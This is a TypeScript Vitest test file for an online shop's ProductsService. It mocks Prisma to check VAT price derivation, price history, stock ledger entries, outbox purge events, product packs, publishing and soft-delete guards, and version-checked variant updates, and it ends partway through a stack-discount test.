import "reflect-metadata";
import { Test } from "@nestjs/testing";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { z } from "zod";
import { Prisma } from "@akai/db";
import type { CreateProduct, CreateVariant } from "@akai/contracts";
import { ProductsService } from "./products.service";
import type { AddMedia } from "./dto/catalog.dto";
import { PrismaService } from "../prisma/prisma.service";
import { TaxRateResolver } from "./tax-rate.resolver";
import { CatalogError } from "./catalog.errors";
import { CATALOG_TOPICS } from "./catalog.events";
import { REVALIDATION_TOPIC } from "../revalidation/revalidation.types";

const PRODUCT_ID = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa";
const VARIANT_ID = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb";
const ACTOR_ID = "cccccccc-cccc-4ccc-8ccc-cccccccccccc";
const MEDIA_ID = "dddddddd-dddd-4ddd-8ddd-dddddddddddd";
const CATEGORY_ID = "ffffffff-ffff-4fff-8fff-ffffffffffff";
/** A variant of some OTHER product, used to probe the ownership check. */
const FOREIGN_VARIANT_ID = "eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee";

/**
 * A recording stand-in for the transaction client.
 *
 * Prisma is mocked at the CLIENT boundary rather than by stubbing the service's
 * own methods, so the assertions below are about the writes the service
 * actually issues — including the ones it issues to the OUTBOX, which is the
 * whole catalog-sync contract and is invisible from the return value.
 */
interface Recorded {
  outbox: { topic: string; payload: Record<string, unknown> }[];
  productCreates: Record<string, unknown>[];
  translationUpserts: Record<string, unknown>[];
  priceHistory: Record<string, unknown>[];
  ledger: Record<string, unknown>[];
  variantCreates: Record<string, unknown>[];
  variantUpdateManyArgs: Record<string, unknown>[];
  productUpdates: Record<string, unknown>[];
  /** Which row each `productUpdates` entry, at the same index, was scoped to. */
  productUpdateWheres: Record<string, unknown>[];
  slugHistoryUpserts: Record<string, unknown>[];
  mediaCreates: Record<string, unknown>[];
  mediaDeleteWheres: Record<string, unknown>[];
  addOnCreateManyData: Record<string, unknown>[];
  addOnDeleteWheres: Record<string, unknown>[];
  packComponentCreateManyData: Record<string, unknown>[];
  packComponentDeleteWheres: Record<string, unknown>[];
  priceTierDeleteWheres: Record<string, unknown>[];
  priceTierCreateManyData: Record<string, unknown>[];
  categoryCreates: Record<string, unknown>[];
  categoryUpdates: Record<string, unknown>[];
  categoryUpdateWheres: Record<string, unknown>[];
}

function buildTx(recorded: Recorded, overrides: Record<string, unknown> = {}) {
  return {
    product: {
      create: vi.fn(async (args: { data: Record<string, unknown> }) => {
        recorded.productCreates.push(args.data);
        return { id: PRODUCT_ID, slug: "camiseta" };
      }),
      update: vi.fn(async (args: { where: Record<string, unknown>; data: Record<string, unknown> }) => {
        recorded.productUpdates.push(args.data);
        recorded.productUpdateWheres.push(args.where);
        return { id: PRODUCT_ID };
      }),
      // Asked by `attachStickyAddOns` on every create. Empty means "no add-on
      // asked to be on new products", which is what every test here assumes
      // unless it overrides this model.
      findMany: vi.fn(async () => [] as { id: string; newProductDefaultVariantId: string | null }[]),
    },
    productVariant: {
      create: vi.fn(async (args: { data: Record<string, unknown> }) => {
        recorded.variantCreates.push(args.data);
        return { id: VARIANT_ID, sku: "AK-1" };
      }),
      update: vi.fn(async () => ({ id: VARIANT_ID })),
      updateMany: vi.fn(async (args: Record<string, unknown>) => {
        recorded.variantUpdateManyArgs.push(args);
        return { count: 1 };
      }),
      // Read inside the transaction only by `update()`'s stack-discount
      // recompute — every existing variant of the product being saved, so
      // each one's tiers can be replaced from ITS OWN current price.
      findMany: vi.fn(async () => [] as { id: string; priceGross: number }[]),
    },
    productVariantPriceTier: {
      deleteMany: vi.fn(async (args: { where: Record<string, unknown> }) => {
        recorded.priceTierDeleteWheres.push(args.where);
        return { count: 0 };
      }),
      createMany: vi.fn(async (args: { data: Record<string, unknown>[] }) => {
        recorded.priceTierCreateManyData.push(...args.data);
        return { count: args.data.length };
      }),
    },
    productTranslation: {
      upsert: vi.fn(async (args: Record<string, unknown>) => {
        recorded.translationUpserts.push(args);
        return {};
      }),
    },
    productCategory: {
      deleteMany: vi.fn(async () => ({ count: 0 })),
      createMany: vi.fn(async () => ({ count: 0 })),
      // How many products currently carry a category — the `removeCategory`
      // guard. 0 by default: most tests are not exercising the "still
      // assigned" refusal.
      count: vi.fn(async () => 0),
    },
    productAddOn: {
      deleteMany: vi.fn(async (args: { where: Record<string, unknown> }) => {
        recorded.addOnDeleteWheres.push(args.where);
        return { count: 0 };
      }),
      // RECORDED, unlike productCategory's, because the ORDER is the thing under
      // test: the array's position becomes `sortOrder`, and that is the whole
      // reason the edge carries one.
      createMany: vi.fn(async (args: { data: Record<string, unknown>[] }) => {
        recorded.addOnCreateManyData.push(...args.data);
        return { count: args.data.length };
      }),
    },
    // `update()`'s `replacePackComponents` — delete-then-recreate inside the
    // transaction, same shape as `productAddOn` immediately above, and
    // RECORDED for the same reason: array position becomes `sortOrder`.
    productPackComponent: {
      deleteMany: vi.fn(async (args: { where: Record<string, unknown> }) => {
        recorded.packComponentDeleteWheres.push(args.where);
        return { count: 0 };
      }),
      createMany: vi.fn(async (args: { data: Record<string, unknown>[] }) => {
        recorded.packComponentCreateManyData.push(...args.data);
        return { count: args.data.length };
      }),
    },
    productSlugHistory: {
      upsert: vi.fn(async (args: Record<string, unknown>) => {
        recorded.slugHistoryUpserts.push(args);
        return {};
      }),
      deleteMany: vi.fn(async () => ({ count: 0 })),
    },
    priceHistory: {
      updateMany: vi.fn(async () => ({ count: 0 })),
      create: vi.fn(async (args: { data: Record<string, unknown> }) => {
        recorded.priceHistory.push(args.data);
        return {};
      }),
    },
    inventoryLedgerEntry: {
      create: vi.fn(async (args: { data: Record<string, unknown> }) => {
        recorded.ledger.push(args.data);
        return {};
      }),
    },
    mediaAsset: {
      create: vi.fn(async (args: { data: Record<string, unknown> }) => {
        recorded.mediaCreates.push(args.data);
        return {};
      }),
      deleteMany: vi.fn(async (args: { where: Record<string, unknown> }) => {
        recorded.mediaDeleteWheres.push(args.where);
        return { count: 1 };
      }),
    },
    outboxMessage: {
      create: vi.fn(async (args: { data: { topic: string; payload: Record<string, unknown> } }) => {
        recorded.outbox.push({ topic: args.data.topic, payload: args.data.payload });
        return {};
      }),
    },
    ...overrides,
    // MERGED ONE LEVEL, not shallow-replaced like every other key above:
    // several category CRUD tests override exactly one sub-method (e.g.
    // `aggregate` alone, to pin the "next sortOrder" without restating
    // `create`'s whole recording behaviour) and rely on the rest of this
    // object's defaults. A plain `...overrides` spread would silently drop
    // `create`/`update`/`findFirst` the moment ANY one of them is overridden.
    category: {
      aggregate: vi.fn(async () => ({ _max: { sortOrder: null } })),
      // Found by default, so update/remove tests do not each have to restate
      // "this category exists" — only the not-found case overrides it.
      findFirst: vi.fn(async () => ({ id: CATEGORY_ID })),
      create: vi.fn(async (args: { data: Record<string, unknown> }) => {
        recorded.categoryCreates.push(args.data);
        return {
          id: CATEGORY_ID,
          slug: args.data["slug"],
          name: args.data["name"],
          sortOrder: args.data["sortOrder"],
        };
      }),
      update: vi.fn(
        async (args: { where: Record<string, unknown>; data: Record<string, unknown> }) => {
          recorded.categoryUpdates.push(args.data);
          recorded.categoryUpdateWheres.push(args.where);
          return {
            id: CATEGORY_ID,
            slug: "recuperacion",
            name: args.data["name"] ?? { es: "Recuperación", en: "Recovery" },
            sortOrder: args.data["sortOrder"] ?? 0,
          };
        },
      ),
      ...(overrides["category"] as Record<string, unknown> | undefined),
    },
  };
}

function emptyRecorded(): Recorded {
  return {
    outbox: [],
    productCreates: [],
    translationUpserts: [],
    priceHistory: [],
    ledger: [],
    variantCreates: [],
    variantUpdateManyArgs: [],
    productUpdates: [],
    productUpdateWheres: [],
    slugHistoryUpserts: [],
    mediaCreates: [],
    mediaDeleteWheres: [],
    addOnCreateManyData: [],
    addOnDeleteWheres: [],
    packComponentCreateManyData: [],
    packComponentDeleteWheres: [],
    priceTierDeleteWheres: [],
    priceTierCreateManyData: [],
    categoryCreates: [],
    categoryUpdates: [],
    categoryUpdateWheres: [],
  };
}

interface Harness {
  service: ProductsService;
  recorded: Recorded;
  prisma: Record<string, ReturnType<typeof vi.fn> | Record<string, unknown>>;
}

async function buildHarness(
  prismaOverrides: Record<string, unknown> = {},
  txOverrides: Record<string, unknown> = {},
  taxRateBps = 2100,
): Promise<Harness> {
  const recorded = emptyRecorded();
  const tx = buildTx(recorded, txOverrides);

  const prisma = {
    $transaction: vi.fn(async (work: (client: unknown) => Promise<unknown>) => work(tx)),
    product: {
      findUnique: vi.fn(async () => null),
      findFirst: vi.fn(async () => null),
      findMany: vi.fn(async () => []),
      updateMany: vi.fn(async () => ({ count: 1 })),
    },
    productVariant: {
      findFirst: vi.fn(async () => null),
      count: vi.fn(async () => 1),
    },
    category: {
      findMany: vi.fn(async () => []),
    },
    productSlugHistory: { findUnique: vi.fn(async () => null) },
    mediaAsset: { deleteMany: vi.fn(async () => ({ count: 1 })) },
    // Read by softDelete's pack-membership guard. Zero means "not a live
    // pack's component" — the assumption every test here makes unless it
    // overrides this model.
    productPackComponent: { count: vi.fn(async () => 0) },
    $queryRaw: vi.fn(async () => []),
    ...prismaOverrides,
  };

  const moduleRef = await Test.createTestingModule({
    providers: [
      ProductsService,
      { provide: PrismaService, useValue: prisma },
      { provide: TaxRateResolver, useValue: { resolveBps: vi.fn(async () => taxRateBps) } },
    ],
  }).compile();

  return { service: moduleRef.get(ProductsService), recorded, prisma };
}

function createInput(overrides: Partial<CreateProduct> = {}): CreateProduct {
  return {
    slug: "camiseta",
    status: "DRAFT",
    taxClass: "STANDARD",
    translations: [
      {
        locale: "es",
        name: "Camiseta",
        shortDescription: "corta",
        description: "larga",
      },
    ],
    variants: [
      {
        sku: "AK-1",
        name: null,
        options: {},
        // 49.99 EUR gross.
        priceGross: 4999 as CreateProduct["variants"][number]["priceGross"],
        compareAtGross: null,
        currency: "EUR",
        weightGrams: 500,
        // No volume pricing by default; the tier tests pass their own.
        priceTiers: [],
        initialStock: 10,
        lowStockThreshold: 5,
        allowBackorder: false,
      },
    ],
    categoryIds: [],
    addOnIds: [],
    restrictedCountries: [],
    listed: true,
    ...overrides,
  };
}

describe("ProductsService.create", () => {
  let harness: Harness;

  beforeEach(async () => {
    harness = await buildHarness({
      product: {
        findUnique: vi.fn(async () => ({
          id: PRODUCT_ID,
          slug: "camiseta",
          status: "DRAFT",
          taxClass: "STANDARD",
          restrictedCountries: [],
          createdAt: new Date("2026-03-01T00:00:00.000Z"),
          updatedAt: new Date("2026-03-01T00:00:00.000Z"),
          deletedAt: null,
          translations: [],
          media: [],
          categories: [],
          addOns: [],
          packComponents: [],
          kind: "SIMPLE" as const,
          variants: [],
        })),
      },
    });
  });

  /**
   * The money assertion.
   *
   * The admin types the VAT-inclusive shelf price (4999). At 21% the net is
   * 4999/1.21 = 4131.4… → 4131, and tax is the REMAINDER (868), not an
   * independently rounded 21% of net. Deriving tax as `gross - net` is what
   * guarantees net + tax === gross exactly and satisfies the database's
   * `priceNet + priceTax = priceGross` CHECK constraint with no ±1c drift.
   */
  it("derives net and tax from the gross price the admin supplied", async () => {
    await harness.service.create(createInput(), ACTOR_ID);

    const [variant] = harness.recorded.variantCreates;

    expect(variant?.["priceGross"]).toBe(4999);
    expect(variant?.["priceNet"]).toBe(4131);
    expect(variant?.["priceTax"]).toBe(868);
    expect(Number(variant?.["priceNet"]) + Number(variant?.["priceTax"])).toBe(4999);
  });

  it("stamps the resolved tax rate onto the variant", async () => {
    await harness.service.create(createInput(), ACTOR_ID);
    expect(harness.recorded.variantCreates[0]?.["taxRateBps"]).toBe(2100);
  });

  it("opens a price-history row so 'what did this cost in March' is answerable", async () => {
    await harness.service.create(createInput(), ACTOR_ID);

    expect(harness.recorded.priceHistory).toHaveLength(1);
    expect(harness.recorded.priceHistory[0]?.["priceGross"]).toBe(4999);
    expect(harness.recorded.priceHistory[0]?.["changedBy"]).toBe(ACTOR_ID);
  });

  it("records initial stock in the append-only ledger, with a reason", async () => {
    await harness.service.create(createInput(), ACTOR_ID);

    const [entry] = harness.recorded.ledger;
    expect(entry?.["movement"]).toBe("RESTOCK");
    expect(entry?.["quantityDelta"]).toBe(10);
    expect(entry?.["reason"]).toBeTruthy();
  });

  it("writes no ledger row when the variant starts with no stock", async () => {
    const input = createInput();
    const [variant] = input.variants;
    if (variant === undefined) throw new Error("fixture");

    await harness.service.create(
      { ...input, variants: [{ ...variant, initialStock: 0 }] },
      ACTOR_ID,
    );

    expect(harness.recorded.ledger).toHaveLength(0);
  });

  /**
   * The storefront-purge contract: the outbox row and the product write commit
   * together. A missing row means a catalogue change the storefront never learns
   * about, serving a stale page until something else happens to purge the tag.
   *
   * THE `catalog.*` DOMAIN EVENTS ARE NO LONGER EMITTED. They existed for one
   * consumer, the TagadaPay catalog mirror, because a checkout there could
   * reference a mirrored variant and nothing else. Whop takes our computed
   * amount on the checkout call, so the mirror is gone — and a row whose only
   * handler is gone does not sit harmlessly, it dead-letters into /admin/jobs on
   * every product edit. The topic survives only as the purge's `reason`.
   */
  it("emits a storefront purge, carrying the change that justified it", async () => {
    await harness.service.create(createInput(), ACTOR_ID);

    const purges = harness.recorded.outbox.filter(
      (message) => message.topic === REVALIDATION_TOPIC,
    );

    expect(purges.length).toBeGreaterThan(0);
    expect(purges.map((message) => message.payload["reason"])).toContain(
      CATALOG_TOPICS.productCreated,
    );
  });

  it("emits NO catalog.* row, so nothing dead-letters on every product write", async () => {
    await harness.service.create(createInput(), ACTOR_ID);

    const topics = harness.recorded.outbox.map((message) => message.topic);
    expect(topics.every((topic) => topic === REVALIDATION_TOPIC)).toBe(true);
  });

  it("writes the outbox row inside the same transaction as the product", async () => {
    await harness.service.create(createInput(), ACTOR_ID);

    // One $transaction call for the whole create. If the outbox write happened
    // outside it, a crash between the two would lose the sync intent forever.
    expect(harness.prisma["$transaction"]).toHaveBeenCalledTimes(1);
    expect(harness.recorded.outbox.length).toBeGreaterThan(0);
  });

  it("rejects duplicate SKUs in one request, naming the offender", async () => {
    const input = createInput();
    const [variant] = input.variants;
    if (variant === undefined) throw new Error("fixture");

    await expect(
      harness.service.create({ ...input, variants: [variant, { ...variant }] }, ACTOR_ID),
    ).rejects.toThrow(/AK-1/);
  });

  describe("stack discount", () => {
    it("writes the fixed schedule, discarding any submitted tiers outright", async () => {
      const input = createInput({ stackDiscountEnabled: true });
      const [variant] = input.variants;
      if (variant === undefined) throw new Error("fixture");

      await harness.service.create(
        {
          ...input,
          variants: [
            { ...variant, priceTiers: [{ minQuantity: 2, unitPriceGross: 1 as never }] },
          ],
        },
        ACTOR_ID,
      );

      const [created] = harness.recorded.variantCreates;
      const tiers = created?.["priceTiers"] as {
        create: { minQuantity: number; unitPriceGross: number }[];
      };

      // 49.99 EUR at -10/-15/-30/-40%.
      expect(tiers.create).toEqual([
        { minQuantity: 2, unitPriceGross: 4499 },
        { minQuantity: 3, unitPriceGross: 4249 },
        { minQuantity: 5, unitPriceGross: 3499 },
        { minQuantity: 10, unitPriceGross: 2999 },
      ]);
    });

    it("persists the flag on the product row", async () => {
      await harness.service.create(createInput({ stackDiscountEnabled: true }), ACTOR_ID);

      expect(harness.recorded.productCreates[0]?.["stackDiscountEnabled"]).toBe(true);
    });

    it("defaults the flag to false when the caller omits it", async () => {
      await harness.service.create(createInput(), ACTOR_ID);

      expect(harness.recorded.productCreates[0]?.["stackDiscountEnabled"]).toBe(false);
    });
  });
});

describe("ProductsService.create — packs", () => {
  const COMPONENT_A = "10000000-0000-4000-8000-000000000001";
  const COMPONENT_B = "10000000-0000-4000-8000-000000000002";
  const COMPONENT_C = "10000000-0000-4000-8000-000000000003";
  const VARIANT_A = "20000000-0000-4000-8000-000000000001";
  const VARIANT_B = "20000000-0000-4000-8000-000000000002";
  const VARIANT_C = "20000000-0000-4000-8000-000000000003";

  const THREE_COMPONENTS = [
    { id: COMPONENT_A, variantId: VARIANT_A, quantity: 1 },
    { id: COMPONENT_B, variantId: VARIANT_B, quantity: 1 },
    { id: COMPONENT_C, variantId: VARIANT_C, quantity: 1 },
  ];

  /** Every pack test needs the ownership check to resolve — each pinned variant really belongs to its named component product. */
  async function buildPackHarness(): Promise<Harness> {
    return buildHarness({
      product: {
        findUnique: vi.fn(async () => hydratedProduct()),
      },
      productVariant: {
        findFirst: vi.fn(async () => null),
        count: vi.fn(async () => 1),
        findMany: vi.fn(async () => [
          { id: VARIANT_A, productId: COMPONENT_A },
          { id: VARIANT_B, productId: COMPONENT_B },
          { id: VARIANT_C, productId: COMPONENT_C },
        ]),
      },
    });
  }

  it("writes kind and a nested pack-components create, position becoming sortOrder", async () => {
    const harness = await buildPackHarness();

    await harness.service.create(
      createInput({ kind: "PACK", packComponents: THREE_COMPONENTS }),
      ACTOR_ID,
    );

    const [product] = harness.recorded.productCreates;
    expect(product?.["kind"]).toBe("PACK");
    expect(product?.["packComponents"]).toEqual({
      create: [
        { componentProductId: COMPONENT_A, componentVariantId: VARIANT_A, sortOrder: 0, quantity: 1 },
        { componentProductId: COMPONENT_B, componentVariantId: VARIANT_B, sortOrder: 1, quantity: 1 },
        { componentProductId: COMPONENT_C, componentVariantId: VARIANT_C, sortOrder: 2, quantity: 1 },
      ],
    });
  });

  it("rejects a pack with fewer than 2 components", async () => {
    const harness = await buildPackHarness();

    await expect(
      harness.service.create(
        createInput({ kind: "PACK", packComponents: THREE_COMPONENTS.slice(0, 1) }),
        ACTOR_ID,
      ),
    ).rejects.toMatchObject({ code: "VALIDATION_FAILED" });
  });

  it("accepts a pack with exactly 2 components (the new floor)", async () => {
    const harness = await buildPackHarness();

    await harness.service.create(
      createInput({ kind: "PACK", packComponents: THREE_COMPONENTS.slice(0, 2) }),
      ACTOR_ID,
    );

    const [product] = harness.recorded.productCreates;
    expect(product?.["kind"]).toBe("PACK");
  });

  it("rejects a non-PACK product that names pack components", async () => {
    const harness = await buildPackHarness();

    await expect(
      harness.service.create(
        createInput({ kind: "SIMPLE", packComponents: THREE_COMPONENTS }),
        ACTOR_ID,
      ),
    ).rejects.toMatchObject({ code: "VALIDATION_FAILED" });
  });

  it("rejects the same component listed twice", async () => {
    const harness = await buildPackHarness();

    await expect(
      harness.service.create(
        createInput({
          kind: "PACK",
          packComponents: [...THREE_COMPONENTS, { id: COMPONENT_A, variantId: VARIANT_A, quantity: 1 }],
        }),
        ACTOR_ID,
      ),
    ).rejects.toMatchObject({ code: "VALIDATION_FAILED" });
  });

  it("rejects a pinned variant that does not belong to its named component product", async () => {
    const harness = await buildHarness({
      product: { findUnique: vi.fn(async () => hydratedProduct()) },
      productVariant: {
        findFirst: vi.fn(async () => null),
        count: vi.fn(async () => 1),
        // VARIANT_A actually belongs to COMPONENT_B, not COMPONENT_A.
        findMany: vi.fn(async () => [
          { id: VARIANT_A, productId: COMPONENT_B },
          { id: VARIANT_B, productId: COMPONENT_B },
          { id: VARIANT_C, productId: COMPONENT_C },
        ]),
      },
    });

    await expect(
      harness.service.create(
        createInput({ kind: "PACK", packComponents: THREE_COMPONENTS }),
        ACTOR_ID,
      ),
    ).rejects.toMatchObject({ code: "VALIDATION_FAILED" });
  });

  it("defaults kind to SIMPLE and writes no pack components when the caller sends neither", async () => {
    const harness = await buildPackHarness();

    await harness.service.create(createInput(), ACTOR_ID);

    const [product] = harness.recorded.productCreates;
    expect(product?.["kind"]).toBe("SIMPLE");
    expect(product?.["packComponents"]).toBeUndefined();
  });
});

describe("ProductsService.setPublished", () => {
  /**
   * Publishing a product with nothing purchasable behind it renders a detail
   * page with a dead buy button. The check lives in the service because the
   * admin UI is not the only writer.
   */
  it("refuses to publish a product with no active variant", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({
          id: PRODUCT_ID,
          slug: "camiseta",
          variants: [],
          translations: [{ id: "t1" }],
        })),
      },
    });

    await expect(harness.service.setPublished(PRODUCT_ID, true)).rejects.toThrow(
      CatalogError,
    );
  });

  it("refuses to publish a product with no translations", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({
          id: PRODUCT_ID,
          slug: "camiseta",
          variants: [{ id: VARIANT_ID }],
          translations: [],
        })),
      },
    });

    await expect(harness.service.setPublished(PRODUCT_ID, true)).rejects.toThrow(
      CatalogError,
    );
  });

  it("applies no such requirement when UNpublishing", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({
          id: PRODUCT_ID,
          slug: "camiseta",
          variants: [],
          translations: [],
        })),
        findUnique: vi.fn(async () => ({
          id: PRODUCT_ID,
          slug: "camiseta",
          status: "DRAFT",
          taxClass: "STANDARD",
          restrictedCountries: [],
          createdAt: new Date(),
          updatedAt: new Date(),
          deletedAt: null,
          translations: [],
          media: [],
          categories: [],
          addOns: [],
          packComponents: [],
          kind: "SIMPLE" as const,
          variants: [],
        })),
      },
    });

    // A broken product must always be removable from the storefront, even
    // though it could not have been published in that state.
    await expect(
      harness.service.setPublished(PRODUCT_ID, false),
    ).resolves.toBeDefined();
    expect(harness.recorded.productUpdates[0]?.["status"]).toBe("DRAFT");
  });

  it("404s on a soft-deleted product", async () => {
    const harness = await buildHarness();
    await expect(
      harness.service.setPublished(PRODUCT_ID, true),
    ).rejects.toThrow(CatalogError);
  });
});

describe("ProductsService.softDelete", () => {
  it("sets deletedAt and ARCHIVED rather than removing the row", async () => {
    const harness = await buildHarness(
      {
        product: {
          findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
        },
      },
      {
        productVariant: {
          updateMany: vi.fn(async () => ({ count: 1 })),
        },
      },
    );

    await harness.service.softDelete(PRODUCT_ID);

    const [update] = harness.recorded.productUpdates;
    // A hard delete would cascade into order lines and destroy financial
    // history; an invoice must still render years later.
    expect(update?.["deletedAt"]).toBeInstanceOf(Date);
    expect(update?.["status"]).toBe("ARCHIVED");
  });

  it("emits product.archived", async () => {
    const harness = await buildHarness(
      { product: { findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })) } },
      { productVariant: { updateMany: vi.fn(async () => ({ count: 1 })) } },
    );

    await harness.service.softDelete(PRODUCT_ID);

    expect(harness.recorded.outbox.map((m) => m.payload["reason"])).toContain(
      CATALOG_TOPICS.productArchived,
    );
  });

  it("refuses while it is still a live pack's component", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
      },
      // Same guard shape `removeCategory` applies to a category still
      // assigned — checked directly against the top-level client, before any
      // transaction opens, so a 409 never leaves a half-applied write behind.
      productPackComponent: { count: vi.fn(async () => 1) },
    });

    await expect(harness.service.softDelete(PRODUCT_ID)).rejects.toMatchObject({
      code: "CONFLICT",
    });
    expect(harness.recorded.productUpdates).toEqual([]);
  });
});

describe("ProductsService.updateVariant", () => {
  function existingVariant(overrides: Record<string, unknown> = {}) {
    return {
      id: VARIANT_ID,
      productId: PRODUCT_ID,
      sku: "AK-1",
      currency: "EUR",
      priceGross: 4999,
      taxRateBps: 2100,
      priceTiers: [],
      version: 7,
      product: { stackDiscountEnabled: false },
      ...overrides,
    };
  }

  function readbackProduct() {
    return {
      id: PRODUCT_ID,
      slug: "camiseta",
      status: "ACTIVE",
      taxClass: "STANDARD",
      restrictedCountries: [],
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null,
      translations: [],
      media: [],
      categories: [],
      addOns: [],
      packComponents: [],
      kind: "SIMPLE" as const,
      variants: [
        {
          id: VARIANT_ID,
          productId: PRODUCT_ID,
          sku: "AK-1",
          name: null,
          options: {},
          currency: "EUR",
          priceNet: 4131,
          priceTax: 868,
          priceGross: 4999,
          compareAtGross: null,
          taxRateBps: 2100,
          priceTiers: [],
          weightGrams: null,
          isActive: true,
          version: 8,
          inventory: null,
          image: null,
          batches: [],
        },
      ],
    };
  }

  /**
   * Optimistic concurrency.
   *
   * The update is scoped by `version`, and a zero affected-row count is a
   * REJECTION rather than something to retry. Without this, two admins editing
   * one variant last-write-wins and one of them watches their price change
   * disappear with no error.
   */
  it("scopes the write by the caller's version", async () => {
    const harness = await buildHarness({
      productVariant: { findFirst: vi.fn(async () => existingVariant()) },
      product: { findFirst: vi.fn(async () => readbackProduct()) },
    });

    await harness.service.updateVariant(VARIANT_ID, { version: 7 }, ACTOR_ID);

    const [args] = harness.recorded.variantUpdateManyArgs;
    const where = args?.["where"];
    expect(where).toMatchObject({ id: VARIANT_ID, version: 7 });
  });

  it("rejects a stale write instead of silently overwriting", async () => {
    const harness = await buildHarness(
      {
        productVariant: { findFirst: vi.fn(async () => existingVariant()) },
        product: { findFirst: vi.fn(async () => readbackProduct()) },
      },
      {
        productVariant: {
          create: vi.fn(async () => ({ id: VARIANT_ID, sku: "AK-1" })),
          updateMany: vi.fn(async () => ({ count: 0 })),
        },
      },
    );

    await expect(
      harness.service.updateVariant(VARIANT_ID, { version: 1 }, ACTOR_ID),
    ).rejects.toThrow(/modified by another write/);
  });

  it("re-derives net and tax whenever the price changes", async () => {
    const harness = await buildHarness({
      productVariant: { findFirst: vi.fn(async () => existingVariant()) },
      product: { findFirst: vi.fn(async () => readbackProduct()) },
    });

    await harness.service.updateVariant(
      VARIANT_ID,
      // 59.99 gross at 21% → net 4958, tax 1041.
      { version: 7, priceGross: 5999 as never },
      ACTOR_ID,
    );

    const data = harness.recorded.variantUpdateManyArgs[0]?.["data"];
    expect(data).toMatchObject({ priceGross: 5999, priceNet: 4958, priceTax: 1041 });
  });

  /**
   * A tax-rate-only change must still rewrite net and tax. Leaving them stale
   * would violate the `priceNet + priceTax = priceGross` CHECK constraint and
   * surface as an opaque database error rather than a domain one.
   */
  it("re-derives components when only the tax rate changes", async () => {
    const harness = await buildHarness({
      productVariant: { findFirst: vi.fn(async () => existingVariant()) },
      product: { findFirst: vi.fn(async () => readbackProduct()) },
    });

    await harness.service.updateVariant(VARIANT_ID, { version: 7, taxRateBps: 1000 }, ACTOR_ID);

    const data = harness.recorded.variantUpdateManyArgs[0]?.["data"];
    expect(data).toMatchObject({ priceGross: 4999, priceNet: 4545, priceTax: 454 });
  });

  it("emits price_changed with both the old and the new gross", async () => {
    const harness = await buildHarness({
      productVariant: { findFirst: vi.fn(async () => existingVariant()) },
      product: { findFirst: vi.fn(async () => readbackProduct()) },
    });

    await harness.service.updateVariant(
      VARIANT_ID,
      { version: 7, priceGross: 5999 as never },
      ACTOR_ID,
    );

    // A price change still gets its own purge reason, distinct from a generic
    // variant update, so an operator reading the outbox can tell WHY the
    // storefront was invalidated. The old/new gross that used to ride alongside
    // is gone with the mirror consumer that read it — our own `price_history`
    // rows are the record of a price change, not a queue payload.
    const event = harness.recorded.outbox.find(
      (message) => message.payload["reason"] === CATALOG_TOPICS.variantPriceChanged,
    );

    expect(event).toBeDefined();
  });

  it("does NOT emit price_changed when the price is untouched", async () => {
    const harness = await buildHarness({
      productVariant: { findFirst: vi.fn(async () => existingVariant()) },
      product: { findFirst: vi.fn(async () => readbackProduct()) },
    });

    await harness.service.updateVariant(VARIANT_ID, { version: 7, sku: "AK-2" }, ACTOR_ID);

    expect(harness.recorded.outbox.map((m) => m.topic)).not.toContain(
      CATALOG_TOPICS.variantPriceChanged,
    );
  });

  it("does not open a price-history row for a non-price edit", async () => {
    const harness = await buildHarness({
      productVariant: { findFirst: vi.fn(async () => existingVariant()) },
      product: { findFirst: vi.fn(async () => readbackProduct()) },
    });

    await harness.service.updateVariant(VARIANT_ID, { version: 7, sku: "AK-2" }, ACTOR_ID);

    expect(harness.recorded.priceHistory).toHaveLength(0);
  });

  describe("stack discount", () => {
    it("replaces tiers with the freshly computed schedule on a price-only edit", async () => {
      const harness = await buildHarness({
        productVariant: {
          findFirst: vi.fn(async () =>
            existingVariant({ product: { stackDiscountEnabled: true } }),
          ),
        },
        product: { findFirst: vi.fn(async () => readbackProduct()) },
      });

      await harness.service.updateVariant(
        VARIANT_ID,
        { version: 7, priceGross: 5999 as never },
        ACTOR_ID,
      );

      expect(harness.recorded.priceTierDeleteWheres).toEqual([{ variantId: VARIANT_ID }]);
      // 59.99 EUR at -10/-15/-30/-40%.
      expect(harness.recorded.priceTierCreateManyData).toEqual([
        { variantId: VARIANT_ID, minQuantity: 2, unitPriceGross: 5399 },
        { variantId: VARIANT_ID, minQuantity: 3, unitPriceGross: 5099 },
        { variantId: VARIANT_ID, minQuantity: 5, unitPriceGross: 4199 },
        { variantId: VARIANT_ID, minQuantity: 10, unitPriceGross: 3599 },
      ]);
    });

    it("ignores any priceTiers the caller submits, even with no price change", async () => {
      const harness = await buildHarness({
        productVariant: {
          findFirst: vi.fn(async () =>
            existingVariant({ product: { stackDiscountEnabled: true } }),
          ),
        },
        product: { findFirst: vi.fn(async () => readbackProduct()) },
      });

      await harness.service.updateVariant(
        VARIANT_ID,
        { version: 7, priceTiers: [{ minQuantity: 2, unitPriceGross: 1 as never }] },
        ACTOR_ID,
      );

      // Price untouched (4999), proving the recompute runs on every call once
      // the flag is on, not only when price itself changed in this call.
      expect(harness.recorded.priceTierCreateManyData).toEqual([
        { variantId: VARIANT_ID, minQuantity: 2, unitPriceGross: 4499 },
        { variantId: VARIANT_ID, minQuantity: 3, unitPriceGross: 4249 },
        { variantId: VARIANT_ID, minQuantity: 5, unitPriceGross: 3499 },
        { variantId: VARIANT_ID, minQuantity: 10, unitPriceGross: 2999 },
      ]);
    });

    it("leaves the freeform tiers path unchanged when the flag is off (regression)", async () => {
      const harness = await buildHarness({
        productVariant: { findFirst: vi.fn(async () => existingVariant()) },
        product: { findFirst: vi.fn(async () => readbackProduct()) },
      });

      await harness.service.updateVariant(
        VARIANT_ID,
        { version: 7, priceTiers: [{ minQuantity: 4, unitPriceGross: 4000 as never }] },
        ACTOR_ID,
      );

